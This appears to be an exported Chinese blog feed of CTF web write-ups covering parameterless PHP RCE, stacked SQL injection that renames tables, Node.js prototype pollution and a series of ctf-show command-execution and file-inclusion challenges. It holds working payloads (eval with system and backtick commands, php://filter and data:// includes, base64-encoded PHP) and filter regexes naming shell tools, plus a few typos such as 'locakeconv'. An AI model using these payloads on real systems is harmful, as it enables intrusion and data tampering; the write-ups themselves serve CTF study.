    <content><![CDATA[<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>进入题目就一句话，啥也没有</p>
<p><img src="/2022/02/10/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/2.png" alt="1"></p>
<p>猜测一下是不是藏起来了？</p>
<p>找了半天没找到，扫描一下目录也没有，最后找到是git源码泄露</p>
<p>用githack来下载源码</p>
<p><img src="/2022/02/10/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/1.png" alt="1"></p>
<p>可以看到需要有四个if需要绕过</p>
<p>第一个是确定以get方式传入exp</p>
<p>第二个是禁止了协议，php伪协议都不行了</p>
<p>第三个<strong>if</strong>(<strong>‘;’ === preg_replace</strong>(<strong>‘/[a-z,_]+((?R)?)/‘, <strong>NULL</strong>, <strong>&lt;**span **class**=”katex math inline”**&gt;</strong>_GET</strong>[<strong>‘exp’</strong>]))中(?R)指的是引用当前表达式后面加了一个？是递归调用（<strong>完全不懂，查了之后才知道</strong>）整个的意思是将匹配到的字符替换为空，也就是说我们只能用无参函数可以嵌套无参函数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a(b(c()))可以使用</span><br><span class="line">a(&#x27;b&#x27;)这种里面有参数的不行</span><br></pre></td></tr></table></figure>

<p>第四个又过滤et info等函数</p>
<p>很明显就是无参数RCE了，</p>
<p>我们现需要看看里面又啥文件，可以构造print_r(scandir(‘.’));</p>
<p>但是我们函数里面又不能有参数，</p>
<p>实在没办法，请教大佬，看了看大佬的wp</p>
<p>学到了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">localeconv()</span><br><span class="line">他是一个数组，第一个就是.我们需要调用数组的第一个又需要介绍一个函数</span><br><span class="line">current（）</span><br><span class="line">他们俩组合current(locakeconv())</span><br><span class="line">就可以调用‘.’拉</span><br></pre></td></tr></table></figure>

<p>那我们把上面的.替换掉</p>
<p><img src="/2022/02/10/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/3.png" alt="1"></p>
<p>可以看到我们需要读取的文件在倒数第三个</p>
<p>这里又学到一个姿势</p>
<p>把数组倒置反向排序，然后选取第二个</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">需要用到的函数：</span><br><span class="line">array_reverse()</span><br><span class="line">next（）</span><br><span class="line">先倒置再取下一个</span><br><span class="line">next（array_reverse()）</span><br></pre></td></tr></table></figure>

<p>那么payload：</p>
<p>？exp=print_r(next(array_reverse(current(localeconv()))));</p>
<p><img src="/2022/02/10/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/4.png" alt="1"></p>
<p>接下来就是读文件了，把print_r换成highlight_file</p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?exp=print_r(next(array_reverse(current(localeconv()))));</span><br></pre></td></tr></table></figure>



<p>就可以拿到flag了</p>
<p><img src="/2022/02/10/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/5.png" alt="1"></p>
]]></content>
  </entry>
  <entry>
    <title>蛛蛛...嘿嘿♥我的蛛蛛</title>
    <url>/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/</url>
    <content><![CDATA[<h1 id="蛛蛛…嘿嘿♥我的蛛蛛"><a href="#蛛蛛…嘿嘿♥我的蛛蛛" class="headerlink" title="蛛蛛…嘿嘿♥我的蛛蛛"></a>蛛蛛…嘿嘿♥我的蛛蛛</h1><p>进去之后先看看</p>
<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/1.png" alt="1"></p>
<p>点了一下，发现方框变多但是只有一个是真的</p>
<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/2.png" alt="1"></p>
<p>查看源代码的时候可以看到哪个是真的</p>
<p>但是一直点也不知道什么时候结束，写一个简单的爬虫脚本方便我们直接得到那个页面</p>
<p>附上我的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开发时间：2022/2/6:16:50</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://hgame-spider.vidar.club/714c5754f1&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    urrl = url + key</span><br><span class="line">    uuu = re.<span class="built_in">compile</span>(<span class="string">&#x27;href=&quot;(.*?)&quot;&#x27;</span>)   <span class="comment">#匹配括号中的内容</span></span><br><span class="line">    r = requests.get(url=urrl)          <span class="comment">#用get方式传入参数</span></span><br><span class="line">    l = re.findall(uuu, r.text)    <span class="comment">#在r.text中匹配UUU规则中的数据</span></span><br><span class="line">    <span class="built_in">print</span>(urrl)                 <span class="comment">#查看访问网址</span></span><br><span class="line">    key = [i <span class="keyword">for</span> i <span class="keyword">in</span> l <span class="keyword">if</span> i != <span class="string">&#x27;&#x27;</span>]  <span class="comment">#从l中提取数据直到他为空</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = key[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>直接访问最后一个网页</p>
<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/4.png" alt="1"></p>
<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/3.png" alt="1"></p>
<p>最后找flag就简单了慢慢找呗，最后发现flag是在请求头里面</p>
]]></content>
  </entry>
  <entry>
    <title>随便注</title>
    <url>/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
    <content><![CDATA[<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>首先进入题目：</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/1.png" alt="1"></p>
<p>看起来是sql注入先试试看看有啥报错</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.png" alt="1"></p>
<p>看起来是单引号字符型漏洞</p>
<p>测试一下他的列数</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/3.png" alt="1"></p>
<p>4看起来不行</p>
<p>测试了一下2的时候可以正常回显</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/4.png" alt="1"></p>
<p>所以列数是2，用select看看有没有回显的地方</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/5.png" alt="1"></p>
<p>看到他过滤了很多东西就连命名表都过滤了但是没有过滤符号</p>
<p>但是没有过滤show所以考虑到堆叠注入</p>
<p>看一看库</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png" alt="1"></p>
<p>表：</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png" alt="1"></p>
<p>发现其中有两个表</p>
<p>看看里面有啥</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/11.png" alt="1"></p>
<p>发现单引号不行，测试一下双引号还有反撇号</p>
<p>发现反撇号`可以</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/7.png" alt="1"></p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/12.png" alt="1"></p>
<p>可以看到1919这个表这里面含有flag但是输出的时候输出的是words表中的数据</p>
<p>而这题又屏蔽了一些可以用的函数</p>
<p>想想其他办法</p>
<p>我们可以重命名表然后把表中的flag改成id这样查询就可以直接查询到id的数据而id的数据就是flag</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload=1&#x27;;RENAME TABLE `words` TO `word1`;RENAME `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100)SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from `words`;#`</span><br></pre></td></tr></table></figure>

<p>就可以直接输出flag了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag&#123;39e1f712-9675-492f-9e7a-7cb9ece7ba2f</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Newcalc0</title>
    <url>/2022/02/15/Newcalc0/</url>
    <content><![CDATA[<h1 id="Newcalc0"><a href="#Newcalc0" class="headerlink" title="Newcalc0"></a>Newcalc0</h1><p>本题是一道nodejs：</p>
<p>是原型链污染</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">什么是原型链污染？</span><br><span class="line">js中几乎所有的东西都是一个对象，任何对象都有一个原型对象，这个原型对象由对象的内置属性proto指向它的构造函数的prototype指向的对象，即任何对象都是由一个构造函数创建的</span><br><span class="line"></span><br><span class="line">function a(name,age)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line">a函数的内容就是a类的构造函数，a中的属性就是this.name、this.age</span><br><span class="line">在javascript中你生名了一个函数a之后，浏览器就会自动生成一个对象b（实例原型），a构造函数中就有一个默认的属性（prototype）指向对象b，b就是函数a的原型对象，其中b有一个默认的属性constructor指向函数a</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/15/Newcalc0/5.png" alt="1"></p>
<p><img src="/2022/02/15/Newcalc0/6.png" alt="1"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">实例对象的__proto__指向实例原型，实例原型的__proto__等于他上一级的实例原型直到object这是由于对象之间存在继承关系当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/15/Newcalc0/7.png" alt="1"></p>
<p><img src="/2022/02/15/Newcalc0/8.png" alt="1"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">原型链污染就是修改其构造函数中的属性值，使其他通过该构造函数实例化出的对象也具有这个属性的值。</span><br><span class="line">由于对象是无序的，当使用第二种方式访问对象时，只能使用指明下标的方式去访问。</span><br><span class="line">因此我们可以通过 a [“proto“] 的方式去访问其原型对象</span><br><span class="line"></span><br><span class="line">当我们调用对象属性时， 会查找属性，如果本身没有，则会去proto中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有proto，那么会去proto的显式原型中查找，一直到null。</span><br><span class="line">p神的文章中提到JavaScript原型链继承</span><br></pre></td></tr></table></figure>

<p>那么我们回到题目：</p>
<p>看到他的源码</p>
<p><img src="/2022/02/15/Newcalc0/1.png" alt="1"></p>
<p>首先这里有一个知识点：</p>
<p>console.table()会将数据以表格的形式输出</p>
<p>我们直接构造console.table([{a:1}],[‘__proto__‘]）就可以添加一个表格更改flag页面中的object.prototype的值，使其绕过判断，直接输出flag</p>
<p><img src="/2022/02/15/Newcalc0/2.png" alt="1"></p>
<p><img src="/2022/02/15/Newcalc0/3.png" alt="1"></p>
]]></content>
      <tags>
        <tag>V&amp;NCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>GameV4.0</title>
    <url>/2022/02/13/GameV4-0/</url>
    <content><![CDATA[<h1 id="GAME-V4-0"><a href="#GAME-V4-0" class="headerlink" title="GAME V4.0"></a>GAME V4.0</h1><p>web的第一道签到题：</p>
<p>打开页面可以看到是一个小游戏：</p>
<p>直接看源代码把</p>
<p><img src="/2022/02/13/GameV4-0/1.png" alt="1"></p>
<p>没什么别的问题，那就看看他的这些子文件中有没有什么信息</p>
<p>最后在data.js中发现</p>
<p><img src="/2022/02/13/GameV4-0/2.png" alt="1"></p>
<p>含有flag名称的新型</p>
<p>解码一下得到flag</p>
<p><img src="/2022/02/13/GameV4-0/3.png" alt="1"></p>
]]></content>
      <tags>
        <tag>V&amp;NCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>GOclac</title>
    <url>/2022/02/15/GOclac/</url>
    <content><![CDATA[<h1 id="gocalc"><a href="#gocalc" class="headerlink" title="gocalc"></a>gocalc</h1><p>这道题目据说是出题的时候出错了；</p>
<p>首先打开题目</p>
<p><img src="/2022/02/15/GOclac/1.png" alt="1"></p>
<p>查看他的提示</p>
<p><img src="/2022/02/15/GOclac/2.png" alt="1"></p>
<p>他提示了flag在session中</p>
<p>我们直接抓包发包，拿到服务器端返回的session值，这次的题目返回没有进行加密</p>
<p>可以直接拿到解码，经过二次解码得到flag</p>
<p><img src="/2022/02/15/GOclac/3.png" alt="1"></p>
]]></content>
      <tags>
        <tag>V&amp;NCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf-show(持续更新)</title>
    <url>/2022/02/22/ctf-show/</url>
    <content><![CDATA[<h1 id="ctf-show-持续更新"><a href="#ctf-show-持续更新" class="headerlink" title="ctf-show(持续更新)"></a>ctf-show(持续更新)</h1><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><h3 id="web-28"><a href="#web-28" class="headerlink" title="web 28"></a>web 28</h3><p><img src="/2022/02/22/ctf-show/web28_1.png" alt="1"></p>
<p>看到题目里面啥也没有，能爆破的地方只有页面上面的url内容</p>
<p>但是如果改txt内容，网页会将我们重定向</p>
<p><img src="/2022/02/22/ctf-show/web28_3.png" alt="1"></p>
<p>导致网页访问不了，直接爆破目录/0/1/替换用bp</p>
<p>最后结果是/72/20/</p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只屏蔽了flag</p>
<p>payload：</p>
<p><code>?c= system(&quot;cat fla*&quot;);</code></p>
<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?c=echo `cat fla*`;</span><br></pre></td></tr></table></figure>

<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>屏蔽了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag system php cat sort shell . 空格  &#x27;</span><br></pre></td></tr></table></figure>

<p>空格过滤，可以用table绕过%09进行绕过</p>
<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了</p>
<p><code>flag system php cat sort shell . 空格 &#39; 反撇 echo ; (</code></p>
<p>但是没过滤include可以包含一个post参数然后用伪协议来读取</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag system php cat sort shell . &#x27; ` echo ; ( &quot;</span><br></pre></td></tr></table></figure>

<p>相比较上一题多过滤了一个双引号，可以post包数字就不需要双引号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">？c=include$_POST[1]?&gt;</span><br><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了一个:好像没什么影响</p>
<p>用上面的payload一样打</p>
<h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>又过滤了&lt;还有=</p>
<p>毫无影响</p>
<h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>又过滤了数字那么之前的方法行不通了</p>
<p>可以把数字直接替换成字母，虽然规范要添加引号包含住，但是不写也可以执行</p>
<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件包含漏洞，可以直接文件包含代码执行：<code>data:text/plain,&lt;?php 你想要执行的代码?&gt;</code></p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?php echo `cat fla*`?&gt;</span><br></pre></td></tr></table></figure>

<p>flag在源代码里</p>
<h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了php还有file，</p>
<p>上面的payload不能用了，我们可以把后面的内容进行一个base64编码进行执行</p>
<p>payload</p>
<p><code>?c=data:text/plain;base64,PD9waHAgZWNobyBgY2F0IGZsYSpgPz4=</code></p>
<h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题的意思就是直接在我们的最后添加一个.php</p>
<p>我们可以直接使用上面的代码执行，执行结束之后直接添加.php也不影响执行</p>
<h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>屏蔽了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">数字 ~ @ # \$ % ^ &amp; * ( ) - + = &#123; &#125; [ ] &#x27; &quot; , &lt; . &gt; ? / \</span><br></pre></td></tr></table></figure>

<p>这里的屏蔽的是中文括号，也就是说我们只能用无参RCE</p>
<p>我们想要查看目录可以用print_r(scandir(‘.’))</p>
<p>既然是无参最难的就是构造”.”</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">localeconv()</span><br><span class="line">他是一个数组，第一个就是.我们需要调用数组的第一个又需要介绍一个函数</span><br><span class="line">current（）</span><br><span class="line">他们俩组合current(locakeconv())</span><br><span class="line">就可以调用‘.’拉</span><br><span class="line">可以用print_r(scandir(current(locakeconv())));</span><br><span class="line">查看目录文件</span><br><span class="line">然后用</span><br><span class="line">array_reverse()</span><br><span class="line">next（）</span><br><span class="line">倒置，取下一个，取到我们想要的文件</span><br></pre></td></tr></table></figure>

<p>然后highlight_file就行</p>
